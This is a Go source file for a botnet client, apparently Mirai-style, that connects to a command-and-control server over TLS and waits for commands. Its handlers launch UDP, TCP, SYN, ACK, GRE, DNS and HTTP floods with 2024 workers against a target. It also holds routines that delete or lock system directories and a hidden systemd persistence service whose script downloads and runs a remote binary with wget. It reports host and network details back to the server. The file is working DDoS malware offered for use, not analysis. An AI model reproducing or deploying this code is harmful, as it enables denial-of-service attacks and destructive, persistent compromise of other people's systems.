package main

import (
	"bytes"
	"context"
	"crypto/sha256"
	"crypto/tls"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"sync"
	"sync/atomic"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/miekg/dns"
)

const C2Address = "birdo.local:7002" // Your C2 server address

var (
	reconnectDelay         = 5 * time.Second
	numWorkers             = 2024
	killerEnabled          = false
	killDirectories        = []string{"/tmp", "/var/run", "/mnt", "/root", "/etc/config", "/data", "/var/lib/", "/sys", "/proc", "/var/cache", "/usr/tmp", "/var/cache", "/var/tmp"}
	whitelistedDirectories = []string{"/var/run/lock", "/var/run/shm", "/etc", "/usr/local", "/var/lib", "/boot", "/lib", "/lib64"}
)

// Protocol Constants and Types
const (
	PacketTypePing         = 0x01
	PacketTypePong         = 0x02
	PacketTypeCommand      = 0x03
	PacketTypeDiagnostic   = 0x04
	PacketTypeHeartbeat    = 0x05
	PacketTypeAuth         = 0x06
	PacketTypeAuthResponse = 0x07
)

type PacketHeader struct {
	Type      uint8
	Length    uint32
	Timestamp int64
	Checksum  uint16
}

type Packet struct {
	Header  PacketHeader
	Payload []byte
}

type CommandPacket struct {
	Method   [16]byte
	TargetIP [4]byte
	Port     uint16
	Duration uint32
	Reserved [16]byte
}

func main() {
	tlsConfig := &tls.Config{
		InsecureSkipVerify: true, // For testing only, use proper cert validation in production
	}

	for {
		conn, err := tls.Dial("tcp", C2Address, tlsConfig)
		if err != nil {
			fmt.Printf("Error connecting to C2: %v\n", err)
			time.Sleep(reconnectDelay)
			continue
		}

		fmt.Println("Connected to C2 server. Authenticating...")

		// Send authentication packet
		authPacket := CreatePacket(PacketTypeAuth, []byte("bot"))
		if err := SendPacket(conn, authPacket); err != nil {
			fmt.Printf("Error sending auth packet: %v\n", err)
			conn.Close()
			time.Sleep(reconnectDelay)
			continue
		}

		// Wait for auth response
		authResponse, err := ReceivePacket(conn)
		if err != nil || authResponse.Header.Type != PacketTypeAuthResponse {
			fmt.Printf("Authentication failed: %v\n", err)
			conn.Close()
			time.Sleep(reconnectDelay)
			continue
		}

		fmt.Println("Authentication successful. Listening for commands...")

		// Start heartbeat routine
		ctx, cancel := context.WithCancel(context.Background())
		defer cancel()
		go sendHeartbeats(conn, ctx)

		// Main command loop
		for {
			packet, err := ReceivePacket(conn)
			if err != nil {
				if err == io.EOF {
					fmt.Println("Connection closed by server. Reconnecting...")
				} else {
					fmt.Printf("Error reading packet: %v\n", err)
				}
				break
			}

			if err := handlePacket(conn, packet); err != nil {
				fmt.Printf("Failed to handle packet: %v\n", err)
			}
		}

		// Cleanup: cancel heartbeat and close connection
		cancel()
		conn.Close()
		fmt.Println("Retrying connection to C2 server...")
		time.Sleep(reconnectDelay)
	}
}

func handlePacket(conn net.Conn, packet Packet) error {
	switch packet.Header.Type {
	case PacketTypePing:
		// Respond to ping
		pongPacket := CreatePacket(PacketTypePong, []byte{})
		return SendPacket(conn, pongPacket)

	case PacketTypeCommand:
		return handleCommandPacket(packet.Payload)

	case PacketTypeDiagnostic:
		// Handle diagnostic request
		return sendDiagnostics(conn)

	case PacketTypeHeartbeat: // Add this case
		heartbeatResponse := CreatePacket(PacketTypeHeartbeat, []byte{})
		return SendPacket(conn, heartbeatResponse)

	default:
		return fmt.Errorf("unknown packet type: %d", packet.Header.Type)
	}
}

func handleCommandPacket(payload []byte) error {
	if len(payload) < 42 {
		return fmt.Errorf("command packet too short")
	}

	var cmdPacket CommandPacket
	copy(cmdPacket.Method[:], payload[0:16])
	copy(cmdPacket.TargetIP[:], payload[16:20])
	cmdPacket.Port = binary.BigEndian.Uint16(payload[20:22])
	cmdPacket.Duration = binary.BigEndian.Uint32(payload[22:26])
	copy(cmdPacket.Reserved[:], payload[26:42])

	// Convert method to string
	method := string(bytes.Trim(cmdPacket.Method[:], "\x00"))
	targetIP := net.IP(cmdPacket.TargetIP[:]).String()

	fmt.Printf("Received command: %s %s:%d for %d seconds\n",
		method, targetIP, cmdPacket.Port, cmdPacket.Duration)

	// Execute the appropriate attack
	switch method {
	case "!udpflood":
		go performUDPFlood(targetIP, int(cmdPacket.Port), int(cmdPacket.Duration))
	case "!udpsmart":
		go udpsmart(targetIP, int(cmdPacket.Port), int(cmdPacket.Duration))
	case "!tcpflood":
		go TCPfloodAttack(targetIP, int(cmdPacket.Port), int(cmdPacket.Duration))
	case "!synflood":
		go performSYNFlood(targetIP, int(cmdPacket.Port), int(cmdPacket.Duration))
	case "!ackflood":
		go performACKFlood(targetIP, int(cmdPacket.Port), int(cmdPacket.Duration))
	case "!greflood":
		go performGREFlood(targetIP, int(cmdPacket.Duration))
	case "!dns":
		go performDNSFlood(targetIP, int(cmdPacket.Port), int(cmdPacket.Duration))
	case "!http":
		go performHTTPFlood(targetIP, int(cmdPacket.Port), int(cmdPacket.Duration))
	case "!reinstall":
		go SystemdPersistence()
	case "!kill":
		go killerMaps()
	case "!lock":
		go locker()
	default:
		return fmt.Errorf("unknown command: %s", method)
	}

	return nil
}

func sendHeartbeats(conn net.Conn, ctx context.Context) {
	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			heartbeat := CreatePacket(PacketTypeHeartbeat, []byte{})
			if err := SendPacket(conn, heartbeat); err != nil {
				fmt.Printf("Error sending heartbeat: %v\n", err)
				return
			}
		case <-ctx.Done():
			return
		}
	}
}

func sendDiagnostics(conn net.Conn) error {
	// Collect system information
	diag := collectDiagnostics()

	// Serialize diagnostics
	diagData, err := serializeDiagnostics(diag)
	if err != nil {
		return err
	}

	// Send diagnostic response
	diagPacket := CreatePacket(PacketTypeDiagnostic, diagData)
	return SendPacket(conn, diagPacket)
}

// Protocol Functions
func CalculateChecksum(data []byte) uint16 {
	// Use the same implementation as in network.go
	hash := sha256.Sum256(data)
	return binary.BigEndian.Uint16(hash[:2])
}

func SerializePacket(packet Packet) ([]byte, error) {
	buf := make([]byte, 19+packet.Header.Length)
	buf[0] = packet.Header.Type
	binary.BigEndian.PutUint32(buf[1:5], packet.Header.Length)
	binary.BigEndian.PutUint64(buf[5:13], uint64(packet.Header.Timestamp))
	binary.BigEndian.PutUint16(buf[17:19], packet.Header.Checksum)
	copy(buf[19:], packet.Payload)

	return buf, nil
}

func DeserializePacket(data []byte) (Packet, error) {
	if len(data) < 19 {
		return Packet{}, fmt.Errorf("packet too small")
	}

	var packet Packet
	packet.Header.Type = data[0]
	packet.Header.Length = binary.BigEndian.Uint32(data[1:5])
	packet.Header.Timestamp = int64(binary.BigEndian.Uint64(data[5:13]))
	packet.Header.Checksum = binary.BigEndian.Uint16(data[17:19])

	if len(data) < int(19+packet.Header.Length) {
		return Packet{}, fmt.Errorf("invalid packet")
	}

	packet.Payload = make([]byte, packet.Header.Length)
	copy(packet.Payload, data[19:19+packet.Header.Length])

	// Verify checksum (optional, depending on your security requirements)
	checksumData := append(data[0:17], data[19:19+packet.Header.Length]...)
	if CalculateChecksum(checksumData) != packet.Header.Checksum {
		return Packet{}, fmt.Errorf("checksum mismatch")
	}

	return packet, nil
}

func CreatePacket(packetType uint8, payload []byte) Packet {
	timestamp := time.Now().UnixNano()
	packet := Packet{
		Header: PacketHeader{
			Type:      packetType,
			Length:    uint32(len(payload)),
			Timestamp: timestamp,
			Checksum:  0, // Will be calculated later
		},
		Payload: payload,
	}

	// Calculate checksum
	tempBuf := make([]byte, 19+packet.Header.Length)
	tempBuf[0] = packet.Header.Type
	binary.BigEndian.PutUint32(tempBuf[1:5], packet.Header.Length)
	binary.BigEndian.PutUint64(tempBuf[5:13], uint64(packet.Header.Timestamp))
	copy(tempBuf[19:], packet.Payload)

	packet.Header.Checksum = CalculateChecksum(append(tempBuf[0:17], tempBuf[19:]...))
	return packet
}

func SendPacket(conn net.Conn, packet Packet) error {
	data, err := SerializePacket(packet)
	if err != nil {
		return err
	}

	_, err = conn.Write(data)
	return err
}

func ReceivePacket(conn net.Conn) (Packet, error) {
	conn.SetReadDeadline(time.Now().Add(30 * time.Second))
	defer conn.SetReadDeadline(time.Time{})

	headerBuf := make([]byte, 19)
	if _, err := io.ReadFull(conn, headerBuf); err != nil {
		return Packet{}, err
	}

	length := binary.BigEndian.Uint32(headerBuf[1:5])
	if length > 16*1024 {
		return Packet{}, fmt.Errorf("packet too large")
	}

	payloadBuf := make([]byte, length)
	if length > 0 {
		if _, err := io.ReadFull(conn, payloadBuf); err != nil {
			return Packet{}, err
		}
	}

	fullPacket := append(headerBuf, payloadBuf...)
	return DeserializePacket(fullPacket)
}

// DNSResponse structure
type DNSResponse struct {
	Answer []struct {
		Data string `json:"data"`
	} `json:"Answer"`
}

// CF DNS over HTTPS to resolve
func resolveTarget(target string) (string, error) {
	if net.ParseIP(target) != nil {
		return target, nil
	}
	url := fmt.Sprintf("https://1.1.1.1/dns-query?name=%s&type=A", target)
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return "", fmt.Errorf("error creating request: %v", err)
	}
	req.Header.Set("Accept", "application/dns-json")
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return "", fmt.Errorf("error sending request: %v", err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return "", fmt.Errorf("error resolving target: received status code %d", resp.StatusCode)
	}
	var dnsResp DNSResponse
	if err := json.NewDecoder(resp.Body).Decode(&dnsResp); err != nil {
		return "", fmt.Errorf("error decoding DNS response: %v", err)
	}
	if len(dnsResp.Answer) == 0 {
		return "", fmt.Errorf("no DNS records found for target")
	}
	return dnsResp.Answer[0].Data, nil
}

// HTTP flood
func performHTTPFlood(target string, targetPort, duration int) {
	rand.Seed(time.Now().UnixNano())
	fmt.Printf("Starting HTTP flood on %s:%d for %d seconds\n", target, targetPort, duration)
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()
	var requestCount int64
	const highPacketSize = 1024
	var wg sync.WaitGroup
	resolvedIP, err := resolveTarget(target)
	if err != nil {
		fmt.Printf("Failed to resolve target: %v\n", err)
		return
	}

	targetURL := fmt.Sprintf("http://%s:%d", resolvedIP, targetPort)

	userAgents := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Version/14.0.3 Safari/537.36",
		"Mozilla/5.0 (Linux; Android 11; SM-G996B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Mobile Safari/537.36",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (Linux; Android 10; Pixel 4 XL Build/QP1A.190821.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36",
	}
	referers := []string{
		"https://www.google.com/",
		"https://www.example.com/",
		"https://www.wikipedia.org/",
		"https://www.reddit.com/",
		"https://www.github.com/",
	}
	acceptLanguages := []string{
		"en-US,en;q=0.9",
		"fr-FR,fr;q=0.9",
		"es-ES,es;q=0.9",
		"de-DE,de;q=0.9",
	}

	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			client := &http.Client{}
			for {
				select {
				case <-ctx.Done():
					return
				default:
					body := make([]byte, highPacketSize)
					req, err := http.NewRequest("POST", targetURL, bytes.NewReader(body))
					if err != nil {
						fmt.Printf("Error creating request: %v\n", err)
						continue
					}
					req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
					req.Header.Set("Referer", referers[rand.Intn(len(referers))])
					req.Header.Set("Accept-Language", acceptLanguages[rand.Intn(len(acceptLanguages))])
					req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
					resp, err := client.Do(req)
					if err != nil {
						fmt.Printf("Error sending HTTP request: %v\n", err)
						continue
					}
					resp.Body.Close()
					atomic.AddInt64(&requestCount, 1)
				}
			}
		}()
	}
	wg.Wait()
	fmt.Printf("HTTP flood complete. Requests sent: %d\n", atomic.LoadInt64(&requestCount))
}

// Udpsmart Flood
func udpsmart(targetIP string, targetPort, duration int) {
	rand.Seed(time.Now().UnixNano())
	fmt.Printf("Starting randomized UDP flood on %s:%d for %d seconds\n", targetIP, targetPort, duration)
	dstIP := net.ParseIP(targetIP)
	if dstIP == nil {
		fmt.Printf("Invalid target IP address: %s\n", targetIP)
		return
	}
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()
	var packetCount int64
	var wg sync.WaitGroup
	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, err := net.ListenPacket("udp", ":0")
			if err != nil {
				fmt.Printf("Error listening for UDP: %v\n", err)
				return
			}
			defer conn.Close()

			for {
				select {
				case <-ctx.Done():
					return
				default:
					payloadSize := rand.Intn(10000) + 25400
					payload := make([]byte, payloadSize)
					rand.Read(payload)
					sourcePort := rand.Intn(65535-1024) + 1024
					_, err := conn.WriteTo(payload, &net.UDPAddr{IP: dstIP, Port: targetPort, Zone: fmt.Sprintf("%d", sourcePort)})
					if err != nil {
						fmt.Printf("Error sending packet: %v\n", err)
						continue
					}
					atomic.AddInt64(&packetCount, 1)
				}
			}
		}()
	}
	wg.Wait()
	fmt.Printf("UDP flood complete. Packets sent: %d\n", atomic.LoadInt64(&packetCount))
}

// UdpFlood
func performUDPFlood(targetIP string, targetPort, duration int) {
	fmt.Printf("Starting UDP flood on %s:%d for %d seconds\n", targetIP, targetPort, duration)
	dstIP := net.ParseIP(targetIP)
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()
	var packetCount int64
	var wg sync.WaitGroup

	maxPayloadSize := 65507
	payload := make([]byte, maxPayloadSize)
	rand.Read(payload)
	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()

			for {
				select {
				case <-ctx.Done():
					return
				default:
					sourcePort := rand.Intn(65535-1024) + 1024
					conn, err := net.DialUDP("udp", &net.UDPAddr{Port: sourcePort}, &net.UDPAddr{IP: dstIP, Port: targetPort})
					if err != nil {
						fmt.Printf("Error creating UDP connection: %v\n", err)
						continue
					}
					_, err = conn.Write(payload)
					if err == nil {
						atomic.AddInt64(&packetCount, 1)
					} else {
						fmt.Printf("Error sending UDP packet: %v\n", err)
					}

					conn.Close()
				}
			}
		}()
	}
	wg.Wait()
	fmt.Printf("UDP flood complete. Packets sent: %d\n", packetCount)
}

// DnsFlood
func performDNSFlood(targetIP string, targetPort, duration int) {
	fmt.Printf("Starting Enhanced DNS flood on %s:%d for %d seconds\n", targetIP, targetPort, duration)
	dstIP := net.ParseIP(targetIP)
	if dstIP == nil {
		fmt.Printf("Invalid target IP address: %s\n", targetIP)
		return
	}

	// Use proper UDP address without Zone field for IPv4
	targetAddr := &net.UDPAddr{
		IP:   dstIP,
		Port: targetPort,
	}

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()

	var packetCount int64
	var wg sync.WaitGroup

	domains := []string{"youtube.com", "google.com", "spotify.com", "netflix.com", "bing.com", "facebook.com", "amazon.com"}
	queryTypes := []uint16{dns.TypeA, dns.TypeAAAA, dns.TypeMX, dns.TypeNS}

	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, err := net.ListenPacket("udp", ":0") // Random source port
			if err != nil {
				fmt.Printf("Error listening for UDP: %v\n", err)
				return
			}
			defer conn.Close()

			for {
				select {
				case <-ctx.Done():
					return
				default:
					domain := domains[rand.Intn(len(domains))]
					queryType := queryTypes[rand.Intn(len(queryTypes))]
					dnsQuery := constructDNSQuery(domain, queryType)
					buffer, err := dnsQuery.Pack()
					if err != nil {
						fmt.Printf("Error packing DNS query: %v\n", err)
						continue
					}

					// Send to the correct target address
					_, err = conn.WriteTo(buffer, targetAddr)
					if err != nil {
						fmt.Printf("Error sending DNS packet: %v\n", err)
						continue
					}
					atomic.AddInt64(&packetCount, 1)
				}
			}
		}()
	}
	wg.Wait()
	fmt.Printf("Enhanced DNS flood completed. Packets sent: %d\n", atomic.LoadInt64(&packetCount))
}

// TcpFlood
func TCPfloodAttack(targetIP string, targetPort, duration int) {
	rand.Seed(time.Now().UnixNano())
	dstIP := net.ParseIP(targetIP)
	if dstIP == nil {
		fmt.Printf("Invalid target IP address\n")
		return
	}
	var packetCount int64
	var wg sync.WaitGroup

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()
	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, err := net.ListenPacket("ip4:tcp", "0.0.0.0")
			if err != nil {
				fmt.Printf("Error creating raw socket: %v\n", err)
				return
			}
			defer conn.Close()
			for {
				select {
				case <-ctx.Done():
					return
				default:
					tcpLayer := &layers.TCP{
						SrcPort:    layers.TCPPort(rand.Intn(52024) + 1024),
						DstPort:    layers.TCPPort(targetPort),
						Seq:        rand.Uint32(),
						Window:     12800,
						SYN:        true,
						DataOffset: 5,
					}
					maxPacketSize := 65535
					ipAndTcpHeadersSize := 20 + 20
					payloadSize := maxPacketSize - ipAndTcpHeadersSize
					payload := make([]byte, payloadSize)
					rand.Read(payload)
					buffer := gopacket.NewSerializeBuffer()
					if err := gopacket.SerializeLayers(buffer, gopacket.SerializeOptions{}, tcpLayer, gopacket.Payload(payload)); err != nil {
						fmt.Printf("Error crafting TCP packet: %v\n", err)
						continue
					}
					packetData := buffer.Bytes()
					if _, err := conn.WriteTo(packetData, &net.IPAddr{IP: dstIP}); err != nil {
						continue
					}
					atomic.AddInt64(&packetCount, 1)
				}
			}
		}()
	}

	wg.Wait()

	fmt.Printf("TCP flood attack completed. Packets sent: %d\n", packetCount)
}

// SynFlood
func performSYNFlood(targetIP string, targetPort, duration int) {
	rand.Seed(time.Now().UnixNano())

	dstIP := net.ParseIP(targetIP)
	if dstIP == nil {
		fmt.Printf("Invalid target IP address\n")
		return
	}

	var packetCount int64
	var wg sync.WaitGroup

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()
	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, err := net.ListenPacket("ip4:tcp", "0.0.0.0")
			if err != nil {
				fmt.Printf("Error creating raw socket: %v\n", err)
				return
			}
			defer conn.Close()
			for {
				select {
				case <-ctx.Done():
					return
				default:
					tcpLayer := &layers.TCP{
						SrcPort:    layers.TCPPort(rand.Intn(52024) + 1024),
						DstPort:    layers.TCPPort(targetPort),
						Seq:        rand.Uint32(),
						Window:     12800,
						SYN:        true,
						DataOffset: 5,
					}
					maxPacketSize := 65535
					ipAndTcpHeadersSize := 20 + 20
					payloadSize := maxPacketSize - ipAndTcpHeadersSize
					payload := make([]byte, payloadSize)
					rand.Read(payload)
					buffer := gopacket.NewSerializeBuffer()
					if err := gopacket.SerializeLayers(buffer, gopacket.SerializeOptions{}, tcpLayer, gopacket.Payload(payload)); err != nil {
						fmt.Printf("Error crafting TCP packet: %v\n", err)
						continue
					}
					packetData := buffer.Bytes()
					if _, err := conn.WriteTo(packetData, &net.IPAddr{IP: dstIP}); err != nil {
						continue
					}
					atomic.AddInt64(&packetCount, 1)
				}
			}
		}()
	}

	wg.Wait()

	fmt.Printf("SYN flood attack completed. Packets sent: %d\n", packetCount)
}

// AckFlood
func performACKFlood(targetIP string, targetPort int, duration int) error {
	rand.Seed(time.Now().UnixNano())
	dstIP := net.ParseIP(targetIP)
	if dstIP == nil {
		return fmt.Errorf("invalid target IP address: %s", targetIP)
	}

	var packetCount int64
	var wg sync.WaitGroup

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()
	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, err := net.ListenPacket("ip4:tcp", "0.0.0.0")
			if err != nil {
				fmt.Printf("Error creating raw socket: %v\n", err)
				return
			}
			defer conn.Close()
			for {
				select {
				case <-ctx.Done():
					return
				default:
					tcpLayer := &layers.TCP{
						SrcPort:    layers.TCPPort(rand.Intn(64312) + 1024),
						DstPort:    layers.TCPPort(targetPort),
						ACK:        true,
						Seq:        rand.Uint32(),
						Ack:        rand.Uint32(),
						Window:     12800,
						DataOffset: 5,
					}
					maxPacketSize := 65535
					ipAndTcpHeadersSize := 20 + 20
					payloadSize := maxPacketSize - ipAndTcpHeadersSize
					payload := make([]byte, payloadSize)
					rand.Read(payload)
					buffer := gopacket.NewSerializeBuffer()
					if err := gopacket.SerializeLayers(buffer, gopacket.SerializeOptions{}, tcpLayer, gopacket.Payload(payload)); err != nil {
						fmt.Printf("Error crafting TCP ACK packet: %v\n", err)
						continue
					}
					packetData := buffer.Bytes()

					if _, err := conn.WriteTo(packetData, &net.IPAddr{IP: dstIP}); err != nil {
						continue
					}
					atomic.AddInt64(&packetCount, 1)
				}
			}
		}()
	}
	wg.Wait()
	fmt.Printf("ACK flood attack completed. Sent %d packets.\n", atomic.LoadInt64(&packetCount))
	return nil
}

// GreFlood
func performGREFlood(targetIP string, duration int) error {
	rand.Seed(time.Now().UnixNano())
	dstIP := net.ParseIP(targetIP)
	if dstIP == nil {
		return fmt.Errorf("invalid target IP address: %s", targetIP)
	}
	var packetCount int64
	var wg sync.WaitGroup

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()

	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, err := net.ListenPacket("ip4:gre", "0.0.0.0")
			if err != nil {
				fmt.Printf("Error creating raw socket: %v\n", err)
				return
			}
			defer conn.Close()

			for {
				select {
				case <-ctx.Done():
					return
				default:
					greLayer := &layers.GRE{}
					maxPacketSize := 65535
					ipAndGreHeadersSize := 20 + 4
					payloadSize := maxPacketSize - ipAndGreHeadersSize
					payload := make([]byte, payloadSize)
					rand.Read(payload)
					buffer := gopacket.NewSerializeBuffer()
					if err := gopacket.SerializeLayers(buffer, gopacket.SerializeOptions{}, greLayer, gopacket.Payload(payload)); err != nil {
						fmt.Printf("Error crafting GRE packet: %v\n", err)
						continue
					}
					packetData := buffer.Bytes()
					if _, err := conn.WriteTo(packetData, &net.IPAddr{IP: dstIP}); err != nil {
						continue
					}
					atomic.AddInt64(&packetCount, 1)
				}
			}
		}()
	}
	wg.Wait()
	fmt.Printf("GRE flood attack completed. Sent %d packets.\n", atomic.LoadInt64(&packetCount))
	return nil
}

// Make the a DNS query message
func constructDNSQuery(domain string, queryType uint16) *dns.Msg {
	msg := new(dns.Msg)
	msg.SetQuestion(dns.Fqdn(domain), queryType)

	// Add EDNS0 to support larger responses
	edns0 := new(dns.OPT)
	edns0.Hdr.Name = "."
	edns0.Hdr.Rrtype = dns.TypeOPT
	edns0.SetUDPSize(4096) // Use 4096 for max payload size
	msg.Extra = append(msg.Extra, edns0)

	return msg
}

// Function to kill specific processes or clean maps
func killerMaps() {
	if !killerEnabled {
		fmt.Println("Killer functionality is disabled. Set killerEnabled to true to enable it.")
		return
	}
	fmt.Println("Running killerMaps() routine to manage process and map cleaning.")
	for _, dir := range killDirectories {
		if isWhitelisted(dir) {
			fmt.Printf("Skipping whitelisted directory: %s\n", dir)
			continue
		}
		if err := os.RemoveAll(dir); err != nil {
			fmt.Printf("Failed to clean directory %s: %v\n", dir, err)
		} else {
			fmt.Printf("Successfully cleaned directory %s\n", dir)
		}
	}
}

// Function to check if a directory is whitelisted
func isWhitelisted(dir string) bool {
	for _, whitelisted := range whitelistedDirectories {
		if dir == whitelisted {
			return true
		}
	}
	return false
}

// Function to lock systems, files, or other resources
func locker() {
	fmt.Println("Running locker() routine for system locking.")
	for _, dir := range killDirectories {
		if isWhitelisted(dir) {
			fmt.Printf("Skipping whitelisted directory: %s\n", dir)
			continue
		}
		cmd := exec.Command("chattr", "+i", dir)
		if err := cmd.Run(); err != nil {
			fmt.Printf("Failed to lock directory %s: %v\n", dir, err)
		} else {
			fmt.Printf("Successfully locked directory %s\n", dir)
		}
	}
}

// Function to stay on the device
func SystemdPersistence() {
	fmt.Println("Running hidden SystemdPersistence() routine for stealth persistence.")
	hiddenDir := "/var/lib/.systemd_helper"
	scriptPath := filepath.Join(hiddenDir, ".systemd_script.sh")
	programPath := filepath.Join(hiddenDir, ".systemd_process")
	url := "http://127.0.0.1/x86"
	err := os.MkdirAll(hiddenDir, 0755)
	if err != nil {
		fmt.Printf("Failed to create hidden directory: %v\n", err)
		return
	}
	fmt.Printf("Created hidden directory: %s\n", hiddenDir)
	scriptContent := fmt.Sprintf(`#!/bin/bash
	URL="%s"
	PROGRAM_PATH="%s"

	# Check if the program exists
	if [ ! -f "$PROGRAM_PATH" ]; then
		echo "Program not found. Downloading..."
		wget -O $PROGRAM_PATH $URL
		chmod +x $PROGRAM_PATH
	fi

	# Check if the program is running
	if ! pgrep -x ".systemd_process" > /dev/null; then
		echo "Program is not running. Starting..."
		$PROGRAM_PATH &
	else
		echo "Program is already running."
	fi
	`, url, programPath)
	err = os.WriteFile(scriptPath, []byte(scriptContent), 0755)
	if err != nil {
		fmt.Printf("Failed to create persistence script: %v\n", err)
		return
	}
	fmt.Printf("Successfully created hidden persistence script at %s\n", scriptPath)
	serviceContent := `[Unit]
						Description=System Helper Service
						After=network.target

						[Service]
						ExecStart=/var/lib/.systemd_helper/.systemd_script.sh
						Restart=always
						RestartSec=60
						StandardOutput=null
						StandardError=null

						[Install]
						WantedBy=multi-user.target
						`
	servicePath := "/etc/systemd/system/systemd-helper.service"
	err = os.WriteFile(servicePath, []byte(serviceContent), 0600)
	if err != nil {
		fmt.Printf("Failed to create systemd service: %v\n", err)
		return
	}
	fmt.Printf("Successfully created systemd service at %s\n", servicePath)
	cmd := exec.Command("systemctl", "daemon-reload")
	if err := cmd.Run(); err != nil {
		fmt.Printf("Failed to reload systemd daemon: %v\n", err)
		return
	}
	cmd = exec.Command("systemctl", "enable", "systemd-helper.service")
	if err := cmd.Run(); err != nil {
		fmt.Printf("Failed to enable systemd service: %v\n", err)
		return
	}
	cmd = exec.Command("systemctl", "start", "systemd-helper.service")
	if err := cmd.Run(); err != nil {
		fmt.Printf("Failed to start systemd service: %v\n", err)
		return
	}
	fmt.Println("Systemd service enabled and started successfully.")
}

// Function to collect diagnostics
func collectDiagnostics() map[string]interface{} {
	hostname, _ := os.Hostname()
	interfaces, _ := net.Interfaces()

	diag := map[string]interface{}{
		"hostname": hostname,
		"os":       os.Getenv("GOOS"),
		"arch":     os.Getenv("GOARCH"),
		"time":     time.Now().Format(time.RFC3339),
		"network":  getNetworkInfo(interfaces),
		"cpu":      getCPUInfo(),
		"memory":   getMemoryInfo(),
	}

	return diag
}

func getNetworkInfo(interfaces []net.Interface) []map[string]interface{} {
	var networkInfo []map[string]interface{}
	for _, iface := range interfaces {
		addrs, _ := iface.Addrs()
		networkInfo = append(networkInfo, map[string]interface{}{
			"name": iface.Name,
			"mac":  iface.HardwareAddr.String(),
			"addrs": func() []string {
				var addrStrings []string
				for _, addr := range addrs {
					addrStrings = append(addrStrings, addr.String())
				}
				return addrStrings
			}(),
		})
	}
	return networkInfo
}

func getCPUInfo() map[string]interface{} {
	// Placeholder for CPU info
	return map[string]interface{}{
		"cores": runtime.NumCPU(),
	}
}

func getMemoryInfo() map[string]interface{} {
	var memStats runtime.MemStats
	runtime.ReadMemStats(&memStats)
	return map[string]interface{}{
		"alloc":       memStats.Alloc,
		"total_alloc": memStats.TotalAlloc,
		"sys":         memStats.Sys,
		"num_gc":      memStats.NumGC,
	}
}

func serializeDiagnostics(diag map[string]interface{}) ([]byte, error) {
	return json.Marshal(diag)
}
